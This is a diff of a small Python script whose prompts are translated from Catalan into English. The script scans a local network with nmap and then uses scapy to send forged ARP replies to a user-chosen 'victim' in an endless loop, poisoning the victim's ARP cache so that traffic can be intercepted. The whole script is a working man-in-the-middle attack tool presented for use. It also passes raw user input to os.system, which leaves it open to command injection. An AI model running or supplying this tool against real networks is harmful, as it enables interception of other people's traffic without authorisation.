@@ -1,4 +1,5 @@
 #!/usr/bin/env python3.7
+#Francisco J. Jimenez
 
 from scapy.all import *
 import time
@@ -6,24 +7,24 @@ import os
 import sys
 
 os.system('ifconfig')
-variable=input("Per favor, introdueixi la xarxa on estas: ")
+variable=input("What is your network e.g 192.168.0.*: ")
 os.system('nmap \%s' % variable)
 
 operation_code=1
 TRUE=1
 
-IPvictima=input("Introdueixi la IP a hackejar: ")
-MACvictima=input("Introdueixi la MAC a hackejar: ")
-IProuter=input("Introdueixi la IP del router: ")
+IPvictim=input("IP to hack: ")
+MACvictim=input("MAC to hack: ")
+IProuter=input("IP router: ")
 
-ARPmodificat=ARP(op=operation_code, psrc=IProuter, pdst=IPvictima, hwdst= MACvictima)
+ARPmodified=ARP(op=operation_code, psrc=IProuter, pdst=IPvictim, hwdst= MACvictim)
 
-COMENSAR=input("Introdueixi si/s per comensar o no/n per sortir: ")
-COMENSAR=COMENSAR.lower()
+START=input("y/yes to continue or n/no to quit: ")
+START=START.lower()
 
-if COMENSAR == 's' or COMENSAR =='si':
+if START == 'y' or START =='yes':
    while TRUE:
-         send(ARPmodificat)
+         send(ARPmodified)
          time.sleep(1)
 else:
    sys.exit()
